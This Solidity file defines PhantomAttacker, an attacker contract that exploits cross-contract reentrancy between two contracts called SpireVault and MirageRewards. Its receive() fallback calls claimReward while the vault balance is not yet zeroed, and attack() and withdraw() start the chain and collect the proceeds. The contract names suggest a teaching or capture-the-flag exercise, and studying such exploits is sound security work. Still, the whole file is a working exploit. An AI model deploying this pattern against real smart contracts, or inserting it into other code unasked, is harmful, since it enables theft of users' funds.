// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// PhantomAttacker exploits the cross-contract reentrancy between
// SpireVault and MirageRewards.
// Like a phantom crossing boundaries unseen, the attacker moves between
// two contracts through stale state, claiming rewards before the
// balance is ever zeroed.

import "./SpireVault.sol";
import "./MirageRewards.sol";

contract PhantomAttacker {
    SpireVault public spireVault;
    MirageRewards public mirageRewards;

    constructor(address _spireVault, address _mirageRewards) {
        spireVault = SpireVault(_spireVault);
        mirageRewards = MirageRewards(_mirageRewards);
    }

    // Fallback triggered when SpireVault sends ETH during withdraw
    // Balance is still non-zero here — phantom slips into MirageRewards
    // Only reenter when receiving from SpireVault, not from MirageRewards reward payment
    receive() external payable {
        if (msg.sender == address(spireVault)) {
            mirageRewards.claimReward();
        }
    }

    // Start the attack: deposit, then trigger the reentrant chain
    function attack() public payable {
        require(msg.value >= 1 ether, "Need at least 1 Ether to attack");
        spireVault.deposit{value: msg.value}();
        spireVault.withdraw();
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
